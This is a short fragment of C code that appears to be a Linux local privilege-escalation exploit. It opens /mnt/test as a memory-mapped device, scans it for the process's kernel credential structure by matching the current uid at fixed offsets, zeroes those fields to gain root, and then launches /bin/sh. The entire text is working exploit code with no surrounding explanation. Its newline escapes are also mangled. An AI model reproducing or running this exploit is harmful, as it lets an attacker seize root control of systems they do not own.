+int search_modify(int* buf){ for(int i=0;i<0x10000/4-12;i++) { if(buf[i]==current_uid && buf[i+6]==current_uid&& buf[i+7]==current_uid &&buf[i+12]==current_uid && buf[i+24]==current_uid && buf[i+25]==current_uid&& buf[i+34]==current_uid && buf[i+39]==current_uid) { printf("find credn); buf[i]=0; buf[i+6]=0; buf[i+7]=0; buf[i+12]=0; buf[i+24]=0; buf[i+25]=0; buf[i+34]=0; buf[i+39]=0; return 1; } } return 0;}int main(int argc,char*argv[]){ int fd1 = open("/mnt/test",O_RDWR); if(fd1==-1) { printf("fd is -1n"); exit(0); } printf("fd is %dn",fd1); int buflen=0x10000; int buf[0x10000/4]={0}; int idx=0; int beginidx; printf("begin searchn"); if(argc>=2) idx=strtol(argv[1],NULL,10); beginidx=idx; for (idx;idx<=beginidx+0x10000;idx++) { lseek(fd1,idx*buflen,SEEK_SET); read(fd1,buf,buflen); if(search_modify(buf)) { printf("final idx is %dn",idx); lseek(fd1,idx*buflen,SEEK_SET); write(fd1,buf,buflen); if(getuid()!=0) { printf("current uid is %dn",getuid()); exit(0); } else{ system("/bin/sh"); return 0; } } } return 0;}
 ```
 
 
